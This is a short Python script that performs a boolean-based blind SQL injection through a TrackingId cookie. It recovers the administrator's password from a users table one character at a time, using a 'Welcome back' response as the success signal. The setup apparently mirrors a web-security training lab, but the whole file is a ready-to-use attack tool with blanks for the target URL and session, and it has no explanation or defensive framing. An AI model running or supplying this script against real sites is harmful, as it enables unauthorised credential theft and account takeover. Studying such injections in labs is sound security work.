import requests as req
import string
import urllib.parse

TRACKING_ID="" # Cookie tracking id where you inject the payload
SESSION="" # If it has session enter it there
URL="" # What url you want to test e.g. google.com
KEY_WORD="Welcome back" # If the injection is valid, match there the keyword
WORD_LIST = string.ascii_lowercase + string.digits


found=False
index=1
password=""

while(True):    
    for char in WORD_LIST:
        payload=f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{index},1)='{char}"
        cookie = {"TrackingId":urllib.parse.quote(payload), "session":SESSION} # Change there if the cookie names are different
        r = req.get("https://"+URL, cookies=cookie)
        if KEY_WORD in r.text:
            password += char
            print(f"Passowrd => {index} => {password}")
            found = True
            break

        print(f"{index} -> {char}")
    if not found:
        break
    else:
        found = False
    index += 1

